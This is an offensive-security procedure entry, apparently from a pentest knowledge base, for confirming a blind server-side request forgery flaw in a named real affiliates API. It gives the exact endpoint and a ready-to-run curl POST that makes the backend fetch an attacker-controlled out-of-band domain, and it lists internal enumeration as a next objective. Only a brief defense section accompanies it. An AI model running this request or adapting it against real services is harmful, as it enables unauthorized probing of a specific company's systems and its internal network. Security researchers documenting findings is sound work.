---
id: proc-exness-confirm-ssrf
tags:
  - ssrf
  - blind-ssrf
type: procedure
tools:
  - '[[tools/oastify-com]]'
tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/post-probe-external-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.648Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-Blind-SSRF-with-External-Domain

## Summary

This procedure confirms a blind SSRF vulnerability by sending a POST request to the vulnerable endpoint with an external attacker-controlled URL, triggering backend DNS resolution and HTTP requests observable via out-of-band tools like oastify.com.

## Description

In the Exness Affiliates API, the /api/partner_integrations/template/probe endpoint accepts a JSON payload with a 'url' parameter that the Python backend fetches without validation. This allows confirmation of SSRF by monitoring interactions on an external domain. The attack targets public-facing web applications and requires no authentication, succeeding in environments with unfiltered URL handling in Python requests library.

## Requirements

1. Access to https://my.exnessaffiliates.com
2. Attacker-controlled domain registered with oastify.com for OAST detection
3. curl or similar HTTP client

## Defense

Defensive measures and detection strategies:

- Implement URL allowlisting to restrict fetches to trusted domains
- Disable redirect following and verbose error logging in Python requests
- Monitor outbound DNS/HTTP from backend servers for anomalous patterns

## Objectives

1. Verify SSRF by observing backend-initiated requests
2. Gather headers like User-Agent for backend fingerprinting
3. Establish foundation for internal enumeration

## Instructions

### Step 1: Prepare OAST Domain

**Context**: Register a unique subdomain on oastify.com to detect incoming requests.

No command needed; use oastify.com dashboard to generate and monitor sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com.

### Step 2: Trigger SSRF Request

**Context**: Send POST with external URL to provoke backend fetch.

**Command** ([[commands/post-probe-external-url]]):

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe \
  -H "Content-Type: application/json" \
  -d '{"data":{"url":"https://sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com"}}'
```

> This command sends the payload; expected output is a generic response, but success is confirmed by DNS/HTTP logs on oastify.com showing Host header and User-Agent: python-requests/2.28.1.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance
- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/post-probe-external-url]]

## Tools Used

- [[tools/oastify-com]]

## Tags

- ssrf
- blind-ssrf
- oast
